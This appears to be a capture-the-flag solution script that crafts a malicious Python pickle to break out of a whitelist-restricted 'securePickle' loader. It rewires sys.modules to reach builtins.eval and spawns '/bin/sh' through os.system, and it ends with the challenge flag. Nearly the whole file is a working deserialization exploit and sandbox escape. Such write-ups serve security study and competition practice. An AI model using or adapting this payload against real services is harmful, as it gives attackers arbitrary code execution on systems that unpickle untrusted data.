#!/usr/bin/python3
from pickle import *
import sys
import struct
import base64

sys.path.append('pyshv1')
import securePickle
securePickle.whitelist.append('sys')

def flatten(x, res=None):
    if res is None:
        res = bytearray()
    if isinstance(x, bytes):
        res += x
    else:
        for r in x:
            flatten(r, res)
    return res

def put(x):
    return [BINPUT, struct.pack('<B', x)]

def get(x):
    return [BINGET, struct.pack('<B', x)]

def sys(x):
    return [GLOBAL, b'sys\n', x.encode(), b'\n']

def pstr(x):
    x = x.encode('utf-8', 'surrogatepass')
    return [BINUNICODE, struct.pack('<I', len(x)), x]

def pdict(*x):
    return [MARK, x, DICT]

def ptuple(*x):
    return [MARK, x, TUPLE]

def getattr(attr):
    ''' get "attr" from the topmost object '''
    return [
        put(0x80),
        # sys.modules['sys'] = obj
        get(0), pstr('sys'), get(0x80), SETITEM,
        sys(attr)
    ]

data = [
    PROTO, b'\x03',
    sys('modules'), put(0),
    getattr('__getitem__'), ptuple(pstr('builtins')), REDUCE,
    getattr('__getattribute__'), ptuple(pstr('eval')), REDUCE,
    ptuple(pstr('__import__("os").system("/bin/sh")')), REDUCE,
    STOP
]

payload = base64.b64encode(flatten(data))
print(payload.decode())
print(securePickle.loads(flatten(data)))

# Balsn{p1Ck1iNg_s0m3_PiCklEs}
